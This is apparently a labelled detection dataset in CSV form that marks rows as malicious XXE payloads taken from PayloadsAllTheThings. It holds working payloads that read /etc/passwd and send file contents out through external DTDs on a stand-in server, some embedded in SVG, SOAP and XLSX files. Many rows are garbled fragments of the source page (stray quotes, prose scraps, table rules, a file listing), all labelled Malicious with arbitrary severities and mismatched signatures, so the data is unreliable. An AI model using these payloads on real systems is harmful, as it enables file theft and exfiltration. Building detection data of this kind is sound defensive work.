Payload,Signature,AttackType,Severity,MITRE,Label,Description
<!DOCTYPE foo [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<!ELEMENT foo ANY >,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
],XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<foo>&callhome;</foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""utf-8""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!DOCTYPE data SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<data>&send;</data>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%all;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" ?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<!DOCTYPE r [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<!ELEMENT r ANY >,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY % sp SYSTEM ""http://127.0.0.1/dtd.xml"">",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%sp;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%param1;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
]>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<r>&exfil;</r>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY % param1 ""<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>"">",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""UTF-8""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<features name=""my-features"" xmlns=""http://karaf.apache.org/xmlns/features/v1.3.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"xsi:schemaLocation=""http://karaf.apache.org/xmlns/features/v1.3.0 http://karaf.apache.org/xmlns/features/v1.3.0"">",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</feature>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</features>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"""errors"":{",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"""errorMessage"":""org.xml.sax.SAXParseException: XML document structures must start and end within the same entity.""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
},XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
},XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</svg>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" standalone=""yes""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<svg width=""128px"" height=""128px"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" version=""1.1"">",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</svg>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" standalone=""yes""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<!DOCTYPE svg [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<!ELEMENT svg ANY >,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY % sp SYSTEM ""http://example.org:8080/xxe.xml"">",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%sp;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%param1;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
]>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<svg viewBox=""0 0 200 200"" version=""1.2"" xmlns=""http://www.w3.org/2000/svg"" style=""fill:red"">",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<flowRoot font-size=""15"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<flowRegion>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</flowRegion>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<flowDiv>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<flowPara>&exfil;</flowPara>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</flowDiv>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</flowRoot>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</svg>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<soap:Body>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
</soap:Body>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
DOCX/XLSX/PPTX,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ODT/ODG/ODP/ODS,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
SVG,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
XML,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
PDF (experimental),XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
JPG (experimental),XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
GIF (experimental),XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
$ 7z l xxe.xlsx,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[...],XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Date      Time    Attr         Size   Compressed  Name,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
------------------- ----- ------------ ------------  ------------------------,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
------------------- ----- ------------ ------------  ------------------------,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
cd XXE,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
zip -r -u ../xxe.xlsx *,DirTraversal_Path,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<cdl>&rrr;</cdl>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<workbook xmlns=""http://schemas.openxmlformats.org/spreadsheetml/2006/main"" xmlns:r=""http://schemas.openxmlformats.org/officeDocument/2006/relationships"">",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""UTF-8"" standalone=""yes""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<sst xmlns=""http://schemas.openxmlformats.org/spreadsheetml/2006/main"" count=""10"" uniqueCount=""10""><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<!-- Load the contents of a sensitive file into a variable -->,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%param1;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
%external;,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY entity_name ""entity_value"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
SYSTEM,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
firstName,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
lastName,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
DOCTYPE,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
It might help to set the ",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"We try to display the content of the file """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
":warning: """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 and ,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Short list of DTD files already stored on Linux systems; list them with ",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
The file ",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 has an injectable entity ,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 at line 148: ,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"1. """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"2. """,XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  This line defines an entity eval that holds another entity definition. This other entity (error) is meant to reference a nonexistent file and append the content of the file entity (the """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 content) to the end of the file path. The ,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 is a URL-encoded ',XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"3. """,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"4. """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Send the content of ",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,High,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Critical,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Send the XML file to the """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- HTTP Content Type: """,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- XML declaration: """,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"**Example**: We can convert the payload to """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"In the HTTP request try to switch the """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"| """,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"| """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
  | ,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"- XML documents must contain one root (""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
